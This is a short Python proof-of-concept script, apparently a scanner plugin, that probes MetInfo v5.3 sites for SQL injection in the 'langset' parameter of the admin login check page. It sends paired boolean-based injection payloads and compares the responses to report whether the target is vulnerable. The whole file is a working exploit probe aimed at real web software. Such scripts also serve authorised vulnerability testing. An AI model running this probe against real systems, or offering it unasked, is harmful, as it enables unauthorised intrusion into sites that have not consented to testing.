#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: metinfo v5.3sql注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2015-0100846
author: Lucifer
description: metinfo /admin/login/login_check.php?langset=cn 的langset 参数没有过滤存在sql注入漏洞。
'''
import sys
import requests
import warnings
def run(url):
        result = ['metinfo v5.3sql注入漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }

        true_url = url + r"/admin/login/login_check.php?langset=cn%27AnD%271%27=%271"
        false_url = url + r"/admin/login/login_check.php?langset=cn%27AnD%271%27=%272"
        try:
            req1 = requests.get(true_url, headers=headers, timeout=10, verify=False)
            req2 = requests.get(false_url, headers=headers, timeout=10, verify=False)
            if r"not have this language" in req2.text and r"not have this language" not in req1.text:
                result[2]=  '存在'
                result[1] = false_url
                return result
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
